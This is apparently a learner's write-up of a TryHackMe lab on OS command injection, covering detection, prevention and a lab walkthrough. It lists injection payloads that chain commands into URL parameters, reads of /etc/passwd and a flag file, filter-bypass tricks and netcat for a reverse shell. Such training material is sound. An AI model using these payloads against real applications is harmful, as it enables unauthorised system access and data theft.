
Command Injection – TryHackMe

💻 Overview

This room introduces the concept of Command Injection, a critical web vulnerability that allows attackers to execute system commands on a host through a vulnerable web application. The module covers detection methods, common payloads, prevention strategies, and hands-on exploitation techniques.

🧪 Key Concepts Covered

What is Command Injection?

Occurs when user input is passed unsanitized into system command functions (e.g., system(), exec() in PHP, or subprocess in Python).

The attacker executes commands with the same privileges as the application.

Often leads to full system compromise if the application has high-level privileges.

Detection Methods

Method

Description

Verbose

Output from injected commands is visible on the page (e.g., whoami returns current user).

Blind

No visible output; attacker infers success via delays (e.g., using sleep, ping), or side-effects.

Useful Payloads

Linux

whoami – Determine user running the app

ls – List directory contents

ping -c 5 127.0.0.1 – Introduce delay for blind testing

sleep 5 – Force delay without ping

cat /etc/passwd – Read system files

nc – Spawn reverse shell

Windows

whoami

dir

ping -n 5 127.0.0.1

timeout /T 5

Bypassing Filters

Use hexadecimal or encoded characters (e.g., \x27 instead of ')

Use different shell operators: ;, &&, |, ``

Use redirection: > or output to known file, then read

Detection Examples

curl http://target.app/?search=term;whoami

For blind: curl http://target.app/?search=term;ping -c 5 127.0.0.1

💡 Prevention Techniques

Avoid Dangerous Functions

PHP: exec(), passthru(), shell_exec()

NodeJS: child_process.exec

Python: os.system, subprocess

Input Sanitization

Accept only expected input formats (e.g., numeric-only input).

Whitelisting input or using strict validation patterns (e.g., regex).

Secure Code Example

$input = filter_input(INPUT_POST, "id", FILTER_VALIDATE_INT);
if ($input !== false) {
    system("some_command $input");
}

✅ Lab Summary

Lab Objective

Identify a command injection point on the hosted application.

Use verbose or blind payloads to execute commands.

Retrieve the flag at /home/tryhackme/flag.txt.

Sample Exploitation Flow

Inject whoami to confirm verbose output:curl http://MACHINE_IP/?search=test;whoami

Try blind injection:curl http://MACHINE_IP/?search=test;ping -c 5 127.0.0.1

Retrieve flag:
curl http://MACHINE_IP/?search=test;cat /home/tryhackme/flag.txt

📅 Takeaways

Command Injection is among the most critical web vulnerabilities due to direct OS access.

Verbose injection is easier to detect; blind injection requires creativity.

Always sanitize input and avoid direct use of shell commands with user input.

Use delay-based techniques, redirection, or curl requests to test blind injection.

✅ Status

Room completed.
